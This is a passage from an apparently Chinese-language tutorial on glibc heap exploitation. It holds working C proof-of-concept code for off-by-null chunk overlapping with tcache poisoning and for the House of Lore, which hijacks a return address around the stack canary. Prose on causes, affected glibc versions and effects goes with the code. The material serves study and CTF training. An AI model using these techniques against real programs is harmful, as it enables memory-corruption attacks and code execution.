class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;c&#x27;.\n&quot;</span>);</span><br><span class="line">    <span class="type">uint8_t</span> *c = (<span class="type">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span>* c_size_ptr = (<span class="type">uint64_t</span>*)(c - <span class="number">8</span>);</span><br><span class="line">    <span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);</span><br><span class="line">    b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;It is easier if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">           <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span></span><br><span class="line">           <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">size_t</span>));</span><br><span class="line">    <span class="type">size_t</span> fake_size = (<span class="type">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>) - (<span class="type">uint8_t</span>*) a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">    *(<span class="type">size_t</span>*) &amp;b[real_b_size-<span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Change the fake chunk&#x27;s size to reflect c&#x27;s new prev_size</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nMake sure that our fake chunk&#x27;s size is equal to c&#x27;s new prev_size.\n&quot;</span>);</span><br><span class="line">    a[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Now we fill the tcache before we free chunk &#x27;c&#x27; to consolidate with our fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nFill tcache.\n&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++) &#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache list.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;c&#x27; and this will consolidate with our fake chunk since &#x27;c&#x27; prev_inuse is not set\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (c.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *d = <span class="built_in">malloc</span>(<span class="number">0x158</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x158) is at %p\n&quot;</span>, d);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// tcache poisoning</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n&quot;</span>);</span><br><span class="line">    <span class="type">uint8_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">free</span>(pad);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, pad);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);</span><br><span class="line">    d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="type">long</span>) stack_var;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(e == stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="漏洞成因-5"><a href="#漏洞成因-5" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>溢出写、<code>off by one</code>、<code>off by null</code></p>
<h3 id="适用范围-5"><a href="#适用范围-5" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
<li>可分配大于处于 <code>unsortedbin</code> 的 <code>chunk</code></li>
</ul>
<h3 id="利用原理-5"><a href="#利用原理-5" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用 <code>off by null</code> 修改掉 <code>chunk</code> 的 <code>size</code> 域的 <code>P</code> 位，绕过 <code>unlink</code> 检查，在堆的后向合并过程中构造出 <code>chunk overlapping</code>。</p>
<ul>
<li>申请 <code>chunk A、chunk B、chunk C、chunk D</code>，<code>chunk D</code> 用来做 <code>gap</code>，<code>chunk A、chunk C</code> 都要处于 <code>unsortedbin</code> 范围</li>
<li>释放 <code>A</code>，进入 <code>unsortedbin</code></li>
<li>对 <code>B</code> 写操作的时候存在 <code>off by null</code>，修改了 <code>C</code> 的 <code>P</code> 位</li>
<li>释放 <code>C</code> 的时候，堆后向合并，直接把 <code>A、B、C</code> 三块内存合并为了一个 <code>chunk</code>，并放到了 <code>unsortedbin</code> 里面</li>
<li>读写合并后的大 <code>chunk</code> 可以操作 <code>chunk B</code> 的内容，<code>chunk B</code> 的头</li>
</ul>
<h3 id="相关技巧-5"><a href="#相关技巧-5" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>虽然该利用技巧至今仍可以利用，但是需要对 <code>unlink</code> 绕过的条件随着版本的增加有所变化。</p>
<p>最开始的 <code>unlink</code> 的代码是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;								      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;								      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;								      \</span></span><br><span class="line"><span class="meta">		<span class="comment">// .....							      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      &#125;									      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">&#125;</span></span></span><br></pre></td></tr></table></figure>

<p>只需要绕过<code>__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)</code> 即可，因此，不需要伪造地址处于高位的 <code>chunk</code> 的 <code>presize</code> 域。</p>
<p>高版本的 <code>unlink</code> 的条件是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line">	<span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>新增了 <code>chunksize (p) != prev_size (next_chunk (p))</code>，对 <code>chunksize</code> 有了检查，伪造的时候需要绕过。</p>
<h3 id="利用效果-5"><a href="#利用效果-5" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>构造 <code>chunk overlap</code> 后，可以任意地址分配</li>
<li>结合其他方法进行任意地址读写</li>
</ul>
<h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">jackpot</span><span class="params">()</span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">intptr_t</span>* stack_buffer_2[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">void</span>* fake_freelist[<span class="number">7</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 20.04.2 - 64bit - glibc-2.31\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating dummy chunks for using up tcache later\n&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *dummies[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) dummies[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="type">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="type">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake free-list on the stack\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++) &#123;</span><br><span class="line">    fake_freelist[i][<span class="number">3</span>] = fake_freelist[i+<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  fake_freelist[<span class="number">6</span>][<span class="number">3</span>] = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake free-list at %p\n&quot;</span>, fake_freelist);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash &quot;</span></span><br><span class="line">          <span class="string">&quot;introduced by smallbin-to-tcache mechanism\n&quot;</span>);</span><br><span class="line">  stack_buffer_2[<span class="number">3</span>] = (<span class="type">intptr_t</span> *)fake_freelist[<span class="number">0</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing dummy chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(dummies[i]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now take all dummies chunk in tcache out\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> offset = (<span class="type">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="type">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="漏洞成因-6"><a href="#漏洞成因-6" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出、<code>use after free</code>、<code>edit after free</code></p>
<h3 id="适用范围-6"><a href="#适用范围-6" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
<li>需要泄露或已知地址</li>
</ul>
<h3 id="利用原理-6"><a href="#利用原理-6" class="headerlink" title="利用原理"></a>利用原理</h3><p>控制 <code>smallbin</code> 的 <code>bk</code> 指针，示例如下：</p>
<ul>
<li>申请 <code>chunk A、chunk B、chunk C</code>，其中 <code>chunk B</code> 大小位于 <code>smallbin</code></li>
<li>释放 <code>B</code>，申请更大的 <code>chunk D</code>，使得 <code>B</code> 进入 <code>smallbin</code></li>
<li>写 <code>A</code>，溢出修改 <code>B</code> 的 <code>bk</code>，指向地址 <code>X</code>，这里有 <code>fake chunk</code></li>
<li>布置 <code>X-&gt;fd == &amp;B</code></li>
<li>分配两次后即可取出位于 <code>X</code> 地址处的 <code>fake chunk</code></li>
</ul>
<h3 id="相关技巧-6"><a href="#相关技巧-6" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>在引入了 <code>tcache stash unlink</code> 的时候，需要注意绕过：</p>
